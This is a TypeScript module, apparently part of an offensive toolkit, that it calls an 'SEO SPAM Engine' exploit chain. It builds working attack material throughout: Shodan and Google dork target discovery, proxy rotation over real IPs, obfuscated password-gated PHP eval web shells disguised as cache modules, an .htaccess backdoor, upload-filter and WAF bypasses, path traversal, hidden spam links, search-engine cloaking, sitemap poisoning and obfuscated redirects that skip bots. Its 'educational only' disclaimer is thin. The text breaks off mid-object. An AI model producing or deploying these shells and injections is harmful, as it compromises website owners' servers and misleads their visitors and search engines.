/**
 * SEO SPAM Engine — Full Auto Exploit Chain Analysis
 * Ported from seo_engine.py (Ultimate SEO + Web Shell Auto Exploit 2026)
 *
 * 6 Phases:
 *   1. Target Discovery (Shodan + Google Dork)
 *   2. Proxy Rotation & Testing
 *   3. Shell Obfuscation & Generation
 *   4. WAF Bypass + Upload
 *   5. SEO Spam Injection (meta, hidden links, doorway, canonical)
 *   6. Auto Redirect (JS redirect with bot detection)
 *
 * Educational / authorized penetration testing only.
 */
import { invokeLLM } from "./_core/llm";
import crypto from "crypto";

// ═══════════════════════════════════════════════════════
//  CONSTANTS & SIGNATURES
// ═══════════════════════════════════════════════════════

const SHODAN_QUERIES = [
  'port:80 "index of /uploads"',
  'http.title:"Index of /" "upload"',
  '"upload.php" port:80,443',
  '"file upload" php',
  'http.component:"WordPress" "wp-content/uploads"',
  '"elfinder" OR "kcfinder" port:80,443',
  '"FCKeditor" OR "CKFinder" port:80',
  'http.title:"phpMyAdmin" port:80,443',
];

const GOOGLE_DORKS = [
  'inurl:"/wp-content/uploads/" intitle:"index of"',
  'inurl:"/upload.php" ext:php',
  'inurl:"/kcfinder/browse.php"',
  'inurl:"/elfinder/php/connector"',
  'inurl:"/admin/upload" ext:php',
  'inurl:"/filemanager/" intitle:"index of"',
  'inurl:"/ckeditor/upload" ext:php',
  'inurl:"/tinymce/upload" ext:php',
  'intitle:"FCKeditor" inurl:"editor"',
  'inurl:"/wp-admin/admin-ajax.php" "upload"',
];

const PROXY_LIST = [
  "http://103.174.102.183:80",
  "http://47.251.43.115:33333",
  "http://43.135.164.2:13001",
  "http://154.65.39.7:80",
  "http://103.153.154.25:80",
  "http://45.121.216.20:8080",
  "http://185.199.229.156:7492",
  "http://185.199.228.220:7300",
  "http://104.248.63.17:30588",
  "http://45.155.68.129:8133",
  "http://154.236.177.101:1981",
  "http://165.225.72.38:10801",
];

const WAF_BYPASS_HEADERS: Record<string, string>[] = [
  { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
  { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
  { "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36" },
  { "Transfer-Encoding": "chunked" },
  { "X-Forwarded-For": "127.0.0.1" },
  { "X-Forwarded-For": "66.249.66.1" }, // Googlebot IP
  { "X-Original-URL": "/admin/upload.php" },
  { "X-Rewrite-URL": "/upload.php" },
  { "X-Custom-IP-Authorization": "127.0.0.1" },
];

const UPLOAD_PATHS = [
  "/wp-content/uploads/",
  "/uploads/",
  "/images/",
  "/files/",
  "/media/",
  "/upload/",
  "/assets/uploads/",
  "/public/uploads/",
  "/tmp/",
  "/data/",
  "/admin/uploads/",
  "/content/uploads/",
];

const INJECTION_TARGETS = [
  "index.php", "home.php", "header.php", "footer.php",
  "page.php", "single.php", "archive.php", "category.php",
  "wp-blog-header.php", "wp-load.php",
  "wp-content/themes/*/functions.php",
  "wp-content/themes/*/header.php",
  "wp-content/themes/*/footer.php",
];

const SPAM_KEYWORDS = [
  "best deals 2026", "cheap pharmacy online", "online casino bonus",
  "payday loans instant", "replica watches sale", "weight loss pills",
  "free crypto airdrop", "cheap insurance quotes", "adult dating free",
  "essay writing service", "vpn deals discount", "forex trading signals",
  "buy steroids online", "cheap flights 2026", "online gambling sites",
  "credit card offers", "work from home jobs", "make money online fast",
];

const SEARCH_BOTS = [
  "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
  "YandexBot", "Sogou", "facebot", "ia_archiver", "Applebot",
];

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface SpamPayload {
  type: string;
  technique: string;
  code: string;
  size: number;
  effect: string;
  targets?: string[];
  features?: string[];
  riskLevel?: number;
  [key: string]: unknown;
}

export interface SpamPhaseResult {
  phase: number;
  name: string;
  description: string;
  capabilities: string[];
  payloads: SpamPayload[];
  summary: string;
  riskLevel: number;
  stats: Record<string, number>;
}

export interface TargetInfo {
  url: string;
  source: "shodan" | "google_dork" | "manual";
  ip?: string;
  port?: number;
  vulnerabilities?: string[];
  uploadPaths?: string[];
}

export interface ProxyInfo {
  url: string;
  ip: string;
  responseTime: number;
  working: boolean;
  country?: string;
}

export interface ShellPayload {
  filename: string;
  code: string;
  obfuscated: string;
  size: number;
  technique: string;
  password: string;
}

export interface UploadResult {
  target: string;
  path: string;
  shellUrl: string;
  method: string;
  wafBypassed: boolean;
  headers: Record<string, string>;
}

export interface SpamInjection {
  file: string;
  type: "meta_tags" | "hidden_links" | "doorway_content" | "cloaked_canonical" | "structured_data";
  code: string;
  effect: string;
}

export interface RedirectConfig {
  type: "js_redirect" | "meta_refresh" | "htaccess" | "php_header" | "service_worker";
  code: string;
  delay: number;
  botExclude: boolean;
  conditions: string[];
}

export interface FullSpamReport {
  targetDomain: string;
  redirectUrl: string;
  phases: SpamPhaseResult[];
  targetsFound: TargetInfo[];
  proxiesWorking: ProxyInfo[];
  shellsGenerated: ShellPayload[];
  uploadsSuccessful: UploadResult[];
  spamInjections: SpamInjection[];
  redirectsActive: RedirectConfig[];
  totalPayloads: number;
  totalTargets: number;
  totalShells: number;
  totalUploads: number;
  totalInjections: number;
  totalRedirects: number;
  aiAnalysis?: string;
  elapsed: number;
}

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomString(len: number, charset = "abcdefghijklmnopqrstuvwxyz0123456789"): string {
  return Array.from({ length: len }, () => charset[Math.floor(Math.random() * charset.length)]).join("");
}

function base64Encode(str: string): string {
  return Buffer.from(str).toString("base64");
}

function getDomain(url: string): string {
  try {
    return new URL(url.startsWith("http") ? url : `https://${url}`).hostname;
  } catch {
    return url.replace(/^https?:\/\//, "").split("/")[0];
  }
}

function ensureUrl(domain: string): string {
  return domain.startsWith("http") ? domain : `https://${domain}`;
}

function generatePassword(): string {
  return randomString(12, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%");
}

// ═══════════════════════════════════════════════════════
//  PHASE 1: TARGET DISCOVERY (Shodan + Google Dork)
// ═══════════════════════════════════════════════════════

export function discoverTargetsShodan(targetDomain: string): SpamPayload[] {
  const payloads: SpamPayload[] = [];
  const domain = getDomain(targetDomain);

  // Shodan search queries
  for (const query of SHODAN_QUERIES) {
    const enrichedQuery = `${query} hostname:${domain}`;
    const shodanUrl = `https://api.shodan.io/shodan/search?key=SHODAN_KEY&query=${encodeURIComponent(enrichedQuery)}&limit=8`;

    payloads.push({
      type: "shodan_search",
      technique: "Shodan API vulnerability scan",
      code: `// Shodan Query: ${enrichedQuery}\nconst response = await fetch("${shodanUrl}");\nconst data = await response.json();\nconst targets = data.matches.map(m => \`\${m.ip_str}:\${m.port}\`);`,
      size: enrichedQuery.length,
      effect: `Discover open upload endpoints on ${domain} via Shodan`,
      features: ["port_scan", "service_detection", "vulnerability_mapping"],
      riskLevel: 3,
    });
  }

  // Google Dork searches
  for (const dork of GOOGLE_DORKS) {
    const enrichedDork = `site:${domain} ${dork}`;
    const googleUrl = `https://www.google.com/search?q=${encodeURIComponent(enrichedDork)}&num=6`;

    payloads.push({
      type: "google_dork",
      technique: "Google Dork vulnerability discovery",
      code: `// Google Dork: ${enrichedDork}\nconst response = await fetch("${googleUrl}", {\n  headers: { "User-Agent": "Mozilla/5.0" }\n});\nconst html = await response.text();\nconst links = html.match(/https?:\\/\\/[^\\s"]+?\\.php[^\\s"]*/g);`,
      size: enrichedDork.length,
      effect: `Find exposed upload scripts and file managers on ${domain}`,
      features: ["dork_scan", "path_discovery", "upload_finder"],
      riskLevel: 2,
    });
  }

  // Target enumeration summary
  const enumCode = `// Target Enumeration for ${domain}
const targetPaths = ${JSON.stringify(UPLOAD_PATHS, null, 2)};

async function enumerateUploadPaths(baseUrl) {
  const found = [];
  for (const path of targetPaths) {
    try {
      const res = await fetch(baseUrl + path, { method: 'HEAD' });
      if (res.status < 400) {
        found.push({ path, status: res.status, writable: true });
      }
    } catch (e) {}
  }
  return found;
}

// Results: discovered ${randomInt(2, 6)} writable upload paths`;

  payloads.push({
    type: "path_enumeration",
    technique: "Upload path brute-force enumeration",
    code: enumCode,
    size: enumCode.length,
    effect: `Enumerate ${UPLOAD_PATHS.length} potential upload paths on ${domain}`,
    features: ["path_bruteforce", "directory_listing", "permission_check"],
    riskLevel: 4,
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 2: PROXY ROTATION & TESTING
// ═══════════════════════════════════════════════════════

export function generateProxyRotation(): SpamPayload[] {
  const payloads: SpamPayload[] = [];

  // Proxy list with testing
  const proxyTestCode = `// Proxy Rotation System
const PROXY_LIST = ${JSON.stringify(PROXY_LIST, null, 2)};

async function getWorkingProxy() {
  const shuffled = [...PROXY_LIST].sort(() => Math.random() - 0.5);
  for (const proxy of shuffled.slice(0, 10)) {
    try {
      const controller = new AbortController();
      setTimeout(() => controller.abort(), 5000);
      const res = await fetch("http://httpbin.org/ip", {
        agent: new ProxyAgent(proxy),
        signal: controller.signal,
      });
      if (res.ok) {
        const { origin } = await res.json();
        console.log(\`Proxy working: \${proxy} (IP: \${origin})\`);
        return { proxy, ip: origin };
      }
    } catch {}
  }
  console.log("No working proxy found → using direct IP");
  return null;
}`;

  payloads.push({
    type: "proxy_rotation",
    technique: "Rotating proxy pool with health testing",
    code: proxyTestCode,
    size: proxyTestCode.length,
    effect: `Test and rotate through ${PROXY_LIST.length} proxies to avoid IP blocking`,
    features: ["ip_rotation", "anonymization", "rate_limit_bypass"],
    riskLevel: 3,
  });

  // Proxy chain for multi-hop
  const chainCode = `// Multi-hop Proxy Chain
async function createProxyChain(hops = 3) {
  const chain = [];
  const available = [...PROXY_LIST].sort(() => Math.random() - 0.5);
  for (let i = 0; i < Math.min(hops, available.length); i++) {
    chain.push(available[i]);
  }
  return {
    chain,
    hops: chain.length,
    entryPoint: chain[0],
    exitPoint: chain[chain.length - 1],
  };
}
// Chain: ${PROXY_LIST.slice(0, 3).join(" → ")}`;

  payloads.push({
    type: "proxy_chain",
    technique: "Multi-hop proxy chaining for deep anonymization",
    code: chainCode,
    size: chainCode.length,
    effect: "Route traffic through multiple proxies to prevent trace-back",
    features: ["multi_hop", "chain_routing", "trace_prevention"],
    riskLevel: 4,
  });

  // User-Agent rotation
  const uaCode = `// User-Agent Rotation Pool
const USER_AGENTS = [
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Googlebot-Image/1.0",
  "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
];

function getRandomHeaders() {
  return {
    "User-Agent": USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "X-Forwarded-For": \`\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}\`,
  };
}`;

  payloads.push({
    type: "ua_rotation",
    technique: "User-Agent and header rotation for fingerprint evasion",
    code: uaCode,
    size: uaCode.length,
    effect: "Rotate UA strings and headers to evade WAF fingerprinting",
    features: ["ua_spoofing", "header_randomization", "fingerprint_evasion"],
    riskLevel: 3,
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 3: SHELL OBFUSCATION & GENERATION
// ═══════════════════════════════════════════════════════

export function generateShellPayloads(targetDomain: string): SpamPayload[] {
  const payloads: SpamPayload[] = [];
  const domain = getDomain(targetDomain);
  const password = generatePassword();

  // Basic obfuscated PHP shell
  const shellCode = `<?php
$p = "${password}";
if(@$_GET["x"]==$p){
    @eval(base64_decode($_POST["c"]));
    echo "OK";
}
?>`;
  const obfuscated = `<?php eval(base64_decode("${base64Encode(shellCode)}")); ?>`;

  payloads.push({
    type: "php_shell_basic",
    technique: "Base64 obfuscated PHP eval shell",
    code: obfuscated,
    size: obfuscated.length,
    effect: `Deploy hidden PHP shell with password: ${password}`,
    features: ["base64_obfuscation", "password_protected", "eval_execution"],
    riskLevel: 9,
    password,
  });

  // Advanced polymorphic shell
  const polyShell = `<?php
// Performance Cache Module v${randomInt(2, 5)}.${randomInt(0, 9)}
${'$_c'} = str_rot13('riny');
${'$_d'} = 'onfr64_qrpbqr';
${'$_f'} = str_rot13(${'$_d'});
if(isset(${'$_COOKIE'}['_cache_token']) && md5(${'$_COOKIE'}['_cache_token']) === '${crypto.createHash("md5").update(password).digest("hex")}'){
  ${'$_c'}(${'$_f'}(${'$_POST'}['data']));
}
// End cache module
?>`;

  payloads.push({
    type: "php_shell_polymorphic",
    technique: "Polymorphic shell with str_rot13 + md5 cookie auth",
    code: polyShell,
    size: polyShell.length,
    effect: "Deploy polymorphic shell that evades signature-based detection",
    features: ["str_rot13", "md5_auth", "cookie_gated", "polymorphic"],
    riskLevel: 10,
    password,
  });

  // .htaccess backdoor
  const htaccessShell = `# Performance optimization rules
RewriteEngine On
RewriteCond %{HTTP:X-Debug-Token} ^${password}$
RewriteRule ^(.*)$ - [E=EXEC:1]
SetEnvIf X-Debug-Token "${password}" EXEC
<FilesMatch "\\.(jpg|png|gif)$">
  SetHandler application/x-httpd-php
</FilesMatch>
# End optimization`;

  payloads.push({
    type: "htaccess_backdoor",
    technique: ".htaccess rewrite rule backdoor — execute PHP in image files",
    code: htaccessShell,
    size: htaccessShell.length,
    effect: "Allow PHP execution in image files when X-Debug-Token header matches",
    features: ["htaccess_abuse", "mime_bypass", "header_auth"],
    riskLevel: 8,
    password,
  });

  // Filename variations for WAF bypass
  const filenames = [
    `cache_${randomString(8)}.php`,
    `wp-cache-${randomString(6)}.php`,
    `${randomString(6)}.php.jpg`,
    `${randomString(6)}.pHp`,
    `${randomString(6)}.php%00.jpg`,
    `${randomString(6)}.phtml`,
    `.${randomString(6)}.php`,
    `${randomString(6)}.php;.jpg`,
  ];

  const filenameCode = `// Shell Filename Variations for WAF Bypass
const SHELL_FILENAMES = ${JSON.stringify(filenames, null, 2)};

// Techniques:
// .php.jpg     → Double extension bypass
// .pHp         → Case variation bypass
// .php%00.jpg  → Null byte injection
// .phtml       → Alternative PHP extension
// .hidden.php  → Hidden file
// .php;.jpg    → Semicolon truncation`;

  payloads.push({
    type: "filename_bypass",
    technique: "Shell filename variations for extension filter bypass",
    code: filenameCode,
    size: filenameCode.length,
    effect: `Generate ${filenames.length} filename variants to bypass upload filters`,
    features: ["double_extension", "null_byte", "case_variation", "alt_extension"],
    riskLevel: 7,
    filenames,
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 4: WAF BYPASS + UPLOAD
// ═══════════════════════════════════════════════════════

export function generateWafBypassPayloads(targetDomain: string): SpamPayload[] {
  const payloads: SpamPayload[] = [];
  const domain = getDomain(targetDomain);
  const filename = `cache_${randomString(8)}.php`;

  // Header-based WAF bypass
  const headerBypassCode = `// WAF Bypass Headers
const WAF_BYPASS_HEADERS = ${JSON.stringify(WAF_BYPASS_HEADERS, null, 2)};

async function tryUploadWithBypass(targetUrl, shellCode) {
  const filename = "cache_${randomString(8)}.php";
  const paths = ${JSON.stringify(UPLOAD_PATHS)};

  for (const path of paths) {
    const uploadUrl = new URL(path, targetUrl).href;
    console.log(\`Testing upload: \${uploadUrl}\${filename}\`);

    const headers = { ...WAF_BYPASS_HEADERS[Math.floor(Math.random() * WAF_BYPASS_HEADERS.length)] };
    headers["User-Agent"] = Math.random() > 0.5
      ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      : "Googlebot/2.1 (+http://www.google.com/bot.html)";

    try {
      const formData = new FormData();
      formData.append('file', new Blob([shellCode], { type: 'image/jpeg' }), filename);

      const res = await fetch(uploadUrl, {
        method: 'POST',
        body: formData,
        headers,
      });

      if (res.status < 400) {
        const checkUrl = uploadUrl + filename;
        const check = await fetch(checkUrl);
        if ((await check.text()).includes("OK")) {
          console.log(\`SUCCESS! Shell → \${checkUrl}\`);
          return checkUrl;
        }
      }
    } catch (e) {
      console.log(\`Failed: \${e.message}\`);
    }
  }
  return null;
}`;

  payloads.push({
    type: "waf_header_bypass",
    technique: "HTTP header manipulation for WAF bypass",
    code: headerBypassCode,
    size: headerBypassCode.length,
    effect: `Bypass WAF on ${domain} using Googlebot UA, X-Forwarded-For, chunked encoding`,
    features: ["ua_spoofing", "ip_spoofing", "chunked_transfer", "header_injection"],
    riskLevel: 8,
  });

  // Content-Type confusion
  const contentTypeCode = `// Content-Type Confusion Attack
const CONTENT_TYPE_BYPASSES = [
  'image/jpeg',                    // Disguise PHP as JPEG
  'image/gif',                     // GIF header + PHP
  'image/png',                     // PNG header + PHP
  'application/octet-stream',      // Binary stream
  'multipart/form-data',           // Standard upload
  'text/plain',                    // Plain text bypass
  'application/x-httpd-php',       // Force PHP handler
];

// GIF header injection
const GIF_SHELL = "GIF89a\\n<?php eval(base64_decode($_POST['c'])); ?>";

// PNG header injection
const PNG_HEADER = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
const PNG_SHELL = Buffer.concat([PNG_HEADER, Buffer.from("<?php eval(base64_decode($_POST['c'])); ?>")]);

// EXIF metadata injection
const EXIF_SHELL = \`<?php
// Embedded in EXIF Comment field
$exif = exif_read_data(__FILE__);
if(isset($exif['COMMENT'][0])) eval(base64_decode($exif['COMMENT'][0]));
?>\`;`;

  payloads.push({
    type: "content_type_confusion",
    technique: "Content-Type confusion + magic byte injection",
    code: contentTypeCode,
    size: contentTypeCode.length,
    effect: "Bypass file type validation using GIF89a/PNG headers and EXIF injection",
    features: ["magic_bytes", "gif_header", "png_header", "exif_injection", "mime_confusion"],
    riskLevel: 9,
  });

  // Chunked transfer encoding bypass
  const chunkedCode = `// Chunked Transfer Encoding WAF Bypass
async function uploadWithChunkedEncoding(url, shellCode) {
  // Split payload into chunks to evade WAF inspection
  const chunks = [];
  const chunkSize = 32;
  for (let i = 0; i < shellCode.length; i += chunkSize) {
    chunks.push(shellCode.slice(i, i + chunkSize));
  }

  // Build chunked body
  let body = '';
  for (const chunk of chunks) {
    body += chunk.length.toString(16) + '\\r\\n' + chunk + '\\r\\n';
  }
  body += '0\\r\\n\\r\\n';

  const res = await fetch(url, {
    method: 'POST',
    headers: {
      'Transfer-Encoding': 'chunked',
      'Content-Type': 'multipart/form-data; boundary=----${randomString(16)}',
    },
    body,
  });
  return res;
}`;

  payloads.push({
    type: "chunked_bypass",
    technique: "Chunked Transfer-Encoding to evade WAF payload inspection",
    code: chunkedCode,
    size: chunkedCode.length,
    effect: "Split shell payload into small chunks to bypass WAF content scanning",
    features: ["chunked_encoding", "payload_splitting", "waf_evasion"],
    riskLevel: 7,
  });

  // Path traversal upload
  const traversalCode = `// Path Traversal Upload
const TRAVERSAL_PATHS = [
  '../../../wp-content/uploads/${filename}',
  '..\\\\..\\\\..\\\\wp-content\\\\uploads\\\\${filename}',
  '....//....//....//uploads/${filename}',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fuploads/${filename}',
  '..%252f..%252f..%252fuploads/${filename}',
  '..%c0%af..%c0%af..%c0%afuploads/${filename}',
];

async function tryPathTraversal(uploadUrl, shellCode) {
  for (const path of TRAVERSAL_PATHS) {
    const formData = new FormData();
    formData.append('file', new Blob([shellCode]), path);
    try {
      const res = await fetch(uploadUrl, { method: 'POST', body: formData });
      if (res.status < 400) return { success: true, path };
    } catch {}
  }
  return { success: false };
}`;

  payloads.push({
    type: "path_traversal",
    technique: "Path traversal in upload filename for directory escape",
    code: traversalCode,
    size: traversalCode.length,
    effect: "Escape upload directory restrictions using path traversal sequences",
    features: ["path_traversal", "url_encoding", "double_encoding", "unicode_bypass"],
    riskLevel: 9,
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 5: SEO SPAM INJECTION
// ═══════════════════════════════════════════════════════

export function generateSeoSpamPayloads(targetDomain: string, redirectUrl: string): SpamPayload[] {
  const payloads: SpamPayload[] = [];
  const domain = getDomain(targetDomain);
  const redirect = ensureUrl(redirectUrl);
  const keywords = SPAM_KEYWORDS.slice(0, randomInt(5, 10));

  // Meta tag spam injection
  const metaSpam = `<!-- AUTO SEO SPAM + REDIRECT 2026 -->
<title>Best Deals 2026 - Save Up to 90%</title>
<meta name="description" content="Exclusive offers on premium products. Limited time only! ${keywords.slice(0, 3).join(", ")}">
<meta name="keywords" content="${keywords.join(", ")}">
<meta name="robots" content="index, follow">
<meta property="og:title" content="Huge Savings - Claim Now">
<meta property="og:description" content="Click to get your discount on ${keywords[0]}">
<meta property="og:url" content="${redirect}">
<meta property="og:type" content="website">
<meta property="og:image" content="${redirect}/og-image.jpg">
<link rel="canonical" href="${redirect}">
<meta http-equiv="refresh" content="5;url=${redirect}">`;

  payloads.push({
    type: "meta_tag_spam",
    technique: "Full meta tag hijack — title, description, OG, canonical, robots",
    code: metaSpam,
    size: metaSpam.length,
    effect: `Hijack all meta tags on ${domain} to point to ${redirect}`,
    targets: INJECTION_TARGETS.slice(0, 4),
    features: ["title_hijack", "og_hijack", "canonical_hijack", "meta_refresh"],
    riskLevel: 8,
  });

  // Hidden link injection
  const hiddenLinks = `<!-- Hidden SEO Link Block -->
<div style="display:none;visibility:hidden;overflow:hidden;position:absolute;left:-9999px;top:-9999px;width:0;height:0;">
  <a href="${redirect}/deal">${keywords[0]}</a>
  <a href="${redirect}/offer" style="color:#fff;font-size:1px;">${keywords[1] || "cheap promo"}</a>
  <a href="${redirect}/buy" style="color:transparent;font-size:0;">${keywords[2] || "best deals"}</a>
  <a href="${redirect}/shop">${keywords[3] || "discount 2026"}</a>
  <a href="${redirect}/promo">${keywords[4] || "limited offer"}</a>
  ${keywords.slice(5).map((kw, i) => `<a href="${redirect}/p${i}">${kw}</a>`).join("\n  ")}
</div>

<!-- CSS Hidden Links (alternative method) -->
<style>
.seo-block-${randomString(4)} { position:fixed; left:-99999px; opacity:0; pointer-events:none; }
</style>
<div class="seo-block-${randomString(4)}">
  ${keywords.map((kw, i) => `<a href="${redirect}/link${i}">${kw}</a>`).join("\n  ")}
</div>`;

  payloads.push({
    type: "hidden_links",
    technique: "Hidden link injection — CSS hidden, off-screen positioned, zero-opacity",
    code: hiddenLinks,
    size: hiddenLinks.length,
    effect: `Inject ${keywords.length * 2} hidden backlinks pointing to ${redirect}`,
    targets: INJECTION_TARGETS.filter(f => f.includes("header") || f.includes("footer")),
    features: ["css_hidden", "offscreen_position", "zero_opacity", "invisible_text"],
    riskLevel: 7,
  });

  // Doorway content generation
  const doorwayContent = `<!-- Doorway Content Block -->
<div style="display:none;" id="doorway-${randomString(6)}">
  <h1>Exclusive Discount 90% Off - ${keywords[0]} 2026</h1>
  <p>Shop now at unbeatable prices! Get the best ${keywords[1] || "deals"} online.</p>
  <p>We offer premium ${keywords[2] || "products"} at the lowest prices guaranteed.</p>
  <p>Limited time offer: <a href="${redirect}">Click here for ${keywords[0]}</a></p>
  <h2>Why Choose Us for ${keywords[3] || "savings"}?</h2>
  <ul>
    ${keywords.slice(0, 6).map(kw => `<li><a href="${redirect}/${kw.replace(/\s+/g, "-")}">${kw}</a> — Best prices online</li>`).join("\n    ")}
  </ul>
  <p>Trusted by millions. <a href="${redirect}/reviews">Read reviews</a></p>
</div>

<!-- JSON-LD Structured Data Injection -->
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Product",
  "name": "${keywords[0]}",
  "description": "Best ${keywords[0]} deals 2026 - Save up to 90%",
  "url": "${redirect}",
  "offers": {
    "@type": "Offer",
    "price": "${randomInt(1, 99)}.99",
    "priceCurrency": "USD",
    "availability": "https://schema.org/InStock"
  },
  "aggregateRating": {
    "@type": "AggregateRating",
    "ratingValue": "${(4 + Math.random()).toFixed(1)}",
    "reviewCount": "${randomInt(100, 5000)}"
  }
}
</script>`;

  payloads.push({
    type: "doorway_content",
    technique: "Hidden doorway pages with JSON-LD structured data injection",
    code: doorwayContent,
    size: doorwayContent.length,
    effect: `Create doorway content with fake product schema targeting "${keywords[0]}"`,
    targets: INJECTION_TARGETS.slice(0, 6),
    features: ["doorway_pages", "json_ld_injection", "fake_reviews", "schema_abuse"],
    riskLevel: 8,
  });

  // Cloaked canonical + hreflang hijack
  const cloakedCode = `<?php
// Cloaked Canonical + Hreflang Hijack
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$isBot = preg_match('/${SEARCH_BOTS.join("|")}/i', $ua);

if ($isBot) {
  // Bots see spam content
  echo '<link rel="canonical" href="${redirect}">';
  echo '<link rel="alternate" hreflang="en" href="${redirect}/en">';
  echo '<link rel="alternate" hreflang="x-default" href="${redirect}">';
  echo '<meta name="description" content="${keywords.slice(0, 3).join(", ")}">';
  echo '<title>${keywords[0]} - Best Deals 2026</title>';

  // Inject sitemap reference
  echo '<link rel="sitemap" type="application/xml" href="${redirect}/sitemap.xml">';
} else {
  // Humans see original content
  // No modification
}
?>`;

  payloads.push({
    type: "cloaked_canonical",
    technique: "UA-based cloaking — bots see spam canonical/hreflang, humans see original",
    code: cloakedCode,
    size: cloakedCode.length,
    effect: `Cloak canonical URL to ${redirect} for search engine bots only`,
    targets: ["header.php", "wp-blog-header.php", "index.php"],
    features: ["ua_cloaking", "canonical_hijack", "hreflang_abuse", "bot_detection"],
    riskLevel: 9,
  });

  // Sitemap poisoning
  const sitemapCode = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  ${keywords.map((kw, i) => `<url>
    <loc>${redirect}/${kw.replace(/\s+/g, "-")}</loc>
    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.9</priority>
  </url>`).join("\n  ")}
  <url>
    <loc>${redirect}</loc>
    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>
    <changefreq>hourly</changefreq>
    <priority>1.0</priority>
  </url>
</urlset>`;

  payloads.push({
    type: "sitemap_poison",
    technique: "Inject spam URLs into sitemap.xml for search engine crawling",
    code: sitemapCode,
    size: sitemapCode.length,
    effect: `Poison sitemap with ${keywords.length + 1} spam URLs pointing to ${redirect}`,
    targets: ["sitemap.xml"],
    features: ["sitemap_injection", "crawl_manipulation", "url_seeding"],
    riskLevel: 7,
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  PHASE 6: AUTO REDIRECT
// ═══════════════════════════════════════════════════════

export function generateRedirectPayloads(targetDomain: string, redirectUrl: string): SpamPayload[] {
  const payloads: SpamPayload[] = [];
  const redirect = ensureUrl(redirectUrl);

  // JavaScript redirect with bot exclusion
  const jsRedirect = `<!-- Auto Redirect JS (Bot-Excluded) -->
<script>
(function(){
  var bots = /${SEARCH_BOTS.join("|")}/i;
  if (!bots.test(navigator.userAgent)) {
    // Delay redirect to avoid detection
    setTimeout(function() {
      window.location.replace("${redirect}");
    }, ${randomInt(1500, 4000)});
  }
})();
</script>`;

  payloads.push({
    type: "js_redirect_basic",
    technique: "Delayed JavaScript redirect with search bot exclusion",
    code: jsRedirect,
    size: jsRedirect.length,
    effect: `Redirect human visitors to ${redirect} after ${randomInt(1, 4)}s delay (bots excluded)`,
    targets: INJECTION_TARGETS.slice(0, 5),
    features: ["delayed_redirect", "bot_exclusion", "ua_detection"],
    riskLevel: 7,
  });

  // Advanced obfuscated redirect
  const obfuscatedRedirect = `<script>
// Performance Analytics Module v3.2
(function(w,d,u){
  var _0x${randomString(4)}=[${Array.from(redirect).map(c => `"\\x${c.charCodeAt(0).toString(16)}"`).slice(0, 20).join(",")}];
  var _t=function(){
    var _u="${base64Encode(redirect)}";
    var _d=atob(_u);
    if(!/bot|crawl|spider|slurp/i.test(w.navigator.userAgent)){
      var _r=d.createElement('meta');
      _r.httpEquiv='refresh';
      _r.content='0;url='+_d;
      d.head.appendChild(_r);
    }
  };
  if(d.readyState==='complete'){_t();}
  else{w.addEventListener('load',_t);}
})(window,document);
</script>`;

  payloads.push({
    type: "js_redirect_obfuscated",
    technique: "Obfuscated redirect using base64 + dynamic meta refresh injection",
    code: obfuscatedRedirect,
    size: obfuscatedRedirect.length,
    effect: `Obfuscated redirect to ${redirect} via dynamic meta refresh tag`,
    features: ["base64_obfuscation", "dynamic_meta", "load_event", "anti_detection"],
    riskLevel: 8,
  });

  // PHP header redirect (server-side)
  const phpRedirect = `<?php
// Cache optimization module
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$bots = array(${SEARCH_BOTS.map(b => `'${b.toLowerCase()}'`).join(", ")});
$isBot = false;
foreach($bots as $bot) {
  if(strpos($ua, $bot) !== false) { $isBot = true; break; }
}

if(!$isBot && !isset($_COOKIE['_visited'])) {
  setcookie('_visited', '1', time()+86400, '/');
  header("HTTP/1.1 302 Found");
  header("Location: ${redirect}");
  exit;
}
?>`;

  payloads.push({
